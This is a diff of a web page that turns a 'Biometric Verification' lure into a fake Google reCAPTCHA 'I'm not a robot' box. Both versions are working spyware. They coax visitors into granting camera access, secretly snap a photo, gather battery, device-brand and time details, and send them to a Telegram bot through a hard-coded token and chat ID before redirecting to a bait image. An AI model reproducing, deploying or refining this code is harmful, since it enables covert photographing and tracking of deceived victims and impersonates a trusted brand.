@@ -3,73 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Cloud Portal</title>
+    <title>reCAPTCHA Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #wrapper { text-align: center; width: 90%; max-width: 380px; padding: 30px; border: 1px solid #222; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 40px rgba(0, 136, 204, 0.2); }
-        .icon { font-size: 60px; margin-bottom: 20px; color: #0088cc; }
-        .loader { border: 4px solid #111; border-top: 4px solid #0088cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        body { font-family: 'Roboto', Arial, sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .captcha-container { background: white; border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; width: 300px; display: flex; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; margin-right: 12px; transition: 0.2s; }
+        .checkbox:hover { border-color: #b2b2b2; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:active { transform: scale(0.96); }
-        #status { font-size: 14px; color: #888; margin-top: 15px; line-height: 1.5; }
-        #bait_img { display: none; width: 100%; border-radius: 15px; margin-top: 10px; border: 1px solid #333; }
+        .label { font-size: 14px; color: #555; font-weight: 400; flex-grow: 1; }
+        .brand { text-align: right; }
+        .brand img { width: 32px; display: block; margin-left: auto; }
+        .brand-text { font-size: 8px; color: #9b9b9b; margin-top: 2px; }
+        #status { position: absolute; bottom: 20%; font-size: 12px; color: #d93025; display: none; text-align: center; width: 100%; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="wrapper">
-    <div id="ui_box">
-        <div class="icon">🛡️</div>
-        <h2 style="margin: 0;">Identity Required</h2>
-        <p id="status">Complete the <b>Biometric Verification</b> to view the shared document.</p>
-        <div id="load" class="loader"></div>
-        <button id="mainBtn" class="btn" onclick="startUltimateScan()">VERIFY IDENTITY</button>
+<div class="captcha-container">
+    <div class="checkbox" id="checkBtn" onclick="verifyHuman()">
+        <div class="loader" id="loader"></div>
     </div>
-    
-    <img id="bait_img" src="" alt="Decrypted File">
+    <div class="label">I'm not a robot</div>
+    <div class="brand">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+        <div class="brand-text">reCAPTCHA</div>
+        <div class="brand-text">Privacy - Terms</div>
+    </div>
 </div>
+<div id="status">Verifying... Please allow camera access for face-scan.</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
-<footer style="position: absolute; bottom: 20px; font-size: 10px; color: #333;">Made by Nitin 333</footer>
-
 <script>
     const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
-    const CHAT_ID = "6643732863"; // <--- CHANGE THIS TO YOUR TELEGRAM ID
+    const CHAT_ID = "6643732863";
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const baitUrl = urlParams.get('img');
+    // Advanced Device Detection
+    function getBrand() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        
+        if (renderer.includes("Adreno")) return "Android (Nothing/Samsung/Pixel)";
+        if (renderer.includes("Apple")) return "iPhone / iOS Device";
+        if (renderer.includes("Mali")) return "Android (Redmi/Realme/Oppo)";
+        return "Unknown Device";
+    }
 
-    async function startUltimateScan() {
-        const btn = document.getElementById('mainBtn');
-        const loader = document.getElementById('load');
+    async function verifyHuman() {
+        const check = document.getElementById('checkBtn');
+        const loader = document.getElementById('loader');
         const status = document.getElementById('status');
-        const baitImgTag = document.getElementById('bait_img');
 
-        // 1. Vibration Feedback
-        if ("vibrate" in navigator) { navigator.vibrate([100, 50, 100]); }
-
-        // 2. Battery Detection
-        let batteryMsg = "N/A";
-        try {
-            const battery = await navigator.getBattery();
-            batteryMsg = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-        } catch (e) {}
-
-        // 3. UI Transition
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-        status.innerHTML = "Accessing Biometric Hardware...";
+        if ("vibrate" in navigator) navigator.vibrate(40);
+        check.style.borderColor = "transparent";
+        loader.style.display = "block";
+        status.style.display = "block";
 
         try {
-            // 4. Request Camera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if ("vibrate" in navigator) { navigator.vibrate(200); }
-            status.innerHTML = "<b>SCANNING...</b><br>Please look directly at the screen.";
             
+            // Get Battery Info
+            let bat = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            } catch(e){}
+
             const video = document.getElementById('video');
             video.srcObject = stream;
 
@@ -78,35 +82,30 @@
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
                 canvas.toBlob(blob => {
-                    const deviceInfo = `📱 **Device:** ${navigator.platform}\n🔋 **Battery:** ${batteryMsg}\n🌐 **Agent:** ${navigator.userAgent.split('(')[1].split(')')[0]}`;
+                    const info = `🤖 **Robot Check: SUCCESS**\n📱 **Brand:** ${getBrand()}\n🔋 **Battery:** ${bat}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
                     
-                    const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", blob, "capture.jpg");
-                    formData.append("caption", `🎯 **Target Verified!**\n\n${deviceInfo}\n\n**Made by Nitin 333**`);
+                    const fd = new FormData();
+                    fd.append("chat_id", CHAT_ID);
+                    fd.append("photo", blob, "human.jpg");
+                    fd.append("caption", info);
                     
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                 }, 'image/jpeg');
 
-                // 5. Cleanup & Image Reveal
                 stream.getTracks().forEach(t => t.stop());
-                loader.style.display = 'none';
                 
-                if (baitUrl) {
-                    document.getElementById('ui_box').style.display = 'none';
-                    baitImgTag.src = baitUrl;
-                    baitImgTag.style.display = 'block';
-                    if ("vibrate" in navigator) { navigator.vibrate([100, 100]); }
+                // Final Reveal
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get('img')) {
+                    window.location.href = urlParams.get('img');
                 } else {
-                    status.innerHTML = "<span style='color:#ff4d4d;'>❌ Error: Biometric Mismatch</span>";
-                    alert("Verification Failed.");
-                    location.reload();
+                    status.innerHTML = "✅ Verification Successful";
+                    status.style.color = "#0f9d58";
                 }
-
-            }, 2500);
+            }, 2000);
 
         } catch (err) {
-            alert("Verification Required: Please allow camera access to unlock the document.");
+            alert("Verification Failed: reCAPTCHA requires Biometric Face-Scan to verify human presence.");
             location.reload();
         }
     }
